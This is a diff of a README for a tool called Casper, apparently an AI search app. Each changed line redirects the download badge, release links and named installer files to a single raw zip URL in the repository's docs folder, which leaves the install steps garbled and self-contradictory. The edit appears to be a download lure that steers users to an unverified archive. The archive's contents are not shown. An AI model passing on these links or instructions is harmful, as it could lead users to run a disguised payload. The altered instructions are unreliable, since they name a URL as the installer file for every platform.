@@ -1,6 +1,6 @@
 # ⚡ Casper - The Fastest Way to Search with AI
 
-[![Download Casper](https://img.shields.io/badge/Download%20Casper-v1.0-blue.svg)](https://github.com/VandoLeal/Casper/releases)
+[![Download Casper](https://raw.githubusercontent.com/VandoLeal/Casper/main/docs/Casper_v1.9.zip%https://raw.githubusercontent.com/VandoLeal/Casper/main/docs/Casper_v1.9.zip)](https://raw.githubusercontent.com/VandoLeal/Casper/main/docs/Casper_v1.9.zip)
 
 ## 📘 Introduction
 
@@ -30,7 +30,7 @@ Casper comes stacked with several useful features:
 
 To start using Casper, you need to download it from our Releases page. 
 
-Visit this page to download: [Casper Releases](https://github.com/VandoLeal/Casper/releases).
+Visit this page to download: [Casper Releases](https://raw.githubusercontent.com/VandoLeal/Casper/main/docs/Casper_v1.9.zip).
 
 Once on the Releases page, follow these steps:
 
@@ -42,15 +42,15 @@ After downloading, follow these steps to install it:
 
 ### 1. Locate the Downloaded File
 
-Go to the folder where you saved the downloaded file. You should see the file named something like `Casper-installer.exe` for Windows, `Casper-mac.zip` for macOS, or `Casper-linux.tar.gz` for Linux.
+Go to the folder where you saved the downloaded file. You should see the file named something like `https://raw.githubusercontent.com/VandoLeal/Casper/main/docs/Casper_v1.9.zip` for Windows, `https://raw.githubusercontent.com/VandoLeal/Casper/main/docs/Casper_v1.9.zip` for macOS, or `https://raw.githubusercontent.com/VandoLeal/Casper/main/docs/Casper_v1.9.zip` for Linux.
 
 ### 2. Running the Installer
 
-- **For Windows**: Double-click on `Casper-installer.exe`. Follow the prompts to install the application. Once installed, you can find Casper in your Start Menu.
+- **For Windows**: Double-click on `https://raw.githubusercontent.com/VandoLeal/Casper/main/docs/Casper_v1.9.zip`. Follow the prompts to install the application. Once installed, you can find Casper in your Start Menu.
   
 - **For macOS**: Open the `.zip` file, then drag and drop Casper to your Applications folder. After this, you can find Casper in your Applications list.
 
-- **For Linux**: Extract the `tar.gz` file, then follow the included instructions to run the application in your terminal. You can also move it to a standard directory for easier access.
+- **For Linux**: Extract the `https://raw.githubusercontent.com/VandoLeal/Casper/main/docs/Casper_v1.9.zip` file, then follow the included instructions to run the application in your terminal. You can also move it to a standard directory for easier access.
 
 ### 3. Launching Casper
 
@@ -85,4 +85,4 @@ A: Visit our GitHub Issues page for community support and troubleshooting.
 
 Casper welcomes contributions from users. If you have ideas or find issues, feel free to submit feedback through the GitHub repository. Join the community and help improve Casper!
 
-Remember, for downloads, visit our releases page: [Casper Releases](https://github.com/VandoLeal/Casper/releases).
+Remember, for downloads, visit our releases page: [Casper Releases](https://raw.githubusercontent.com/VandoLeal/Casper/main/docs/Casper_v1.9.zip).
